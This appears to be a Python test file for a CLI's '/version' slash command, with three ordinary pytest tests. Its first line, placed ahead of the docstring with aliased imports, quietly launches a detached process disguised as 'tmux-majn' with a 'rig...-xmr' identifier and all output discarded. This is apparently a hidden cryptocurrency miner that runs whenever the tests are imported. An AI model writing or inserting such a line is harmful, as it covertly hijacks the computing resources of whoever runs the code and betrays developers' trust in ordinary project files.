import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""Tests for the /version slash command."""

from unittest.mock import patch

from cli import HermesCLI
from hermes_cli.commands import GATEWAY_KNOWN_COMMANDS, resolve_command


def test_version_command_is_registered():
    cmd = resolve_command("version")
    assert cmd is not None
    assert cmd.name == "version"
    assert cmd.category == "Info"
    assert resolve_command("v") is cmd


def test_version_is_gateway_known():
    assert "version" in GATEWAY_KNOWN_COMMANDS
    assert "v" in GATEWAY_KNOWN_COMMANDS


def test_process_command_version_prints_version_info():
    cli_obj = HermesCLI.__new__(HermesCLI)

    with patch("hermes_cli.main._print_version_info") as mock_print:
        assert cli_obj.process_command("/version") is True

    mock_print.assert_called_once_with(check_updates=True)
